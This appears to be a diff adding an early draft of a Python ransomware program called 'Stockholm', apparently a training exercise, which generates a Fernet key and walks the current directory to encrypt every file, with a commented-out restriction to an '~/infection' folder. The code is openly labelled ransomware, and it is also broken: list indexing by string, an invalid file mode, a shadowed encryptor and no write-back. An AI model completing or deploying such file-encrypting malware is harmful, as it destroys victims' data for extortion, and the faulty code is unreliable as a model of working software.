@@ -1,0 +1,45 @@
+#!/usr/bin/env python
+from cryptography.fernet import Fernet
+from tqdm import tqdm
+import argparse
+import sys
+import os
+
+def encrypt() :
+	curr_dir = os.getcwd()
+	key = Fernet.generate_key()
+	with open("key.key", "wb") as key_file:
+		key_file.write(key)
+	f = Fernet(key)
+	files = []
+	for (curr_dir, dir_names, file_names) in os.walk(curr_dir):
+		files_tmp = [f"{curr_dir}/{i}" for i in file_names]
+		files.extend(files_tmp)
+	for i in files:
+		with open(files[i], "wrb") as f:
+			f.encrypt(f.read())
+	
+
+def main() :
+	try:
+		# home_dir = os.path.expanduser("~")
+		# curr_dir = os.getcwd()
+		# target_dir = os.path.join(home_dir, "/infection")
+		# if curr_dir != target_dir :
+		# 	raise Exception(f"currently in {curr_dir}, should be in {target_dir}");
+		parser = argparse.ArgumentParser(description="File Encryption Ransomware")
+		parser.add_argument("-v", "--version", help="display current stockholm version", action="store_true")
+		parser.add_argument("-r", "--reverse", metavar="KEY", type=str, help="decrypt files")
+		parser.add_argument("-s", "--silent", help="do not display anything", action="store_true")
+		args = parser.parse_args()
+		with open("extensions", "r") as f:
+			extensions = [i.strip() for i in f.readlines() if i.strip()]
+		if args.version :
+			print("Stockholm: v0.01")
+		if not args.reverse :
+			encrypt();
+	except Exception as e:
+		print(f"Error: {e}")
+
+if __name__ == "__main__" :
+	main()
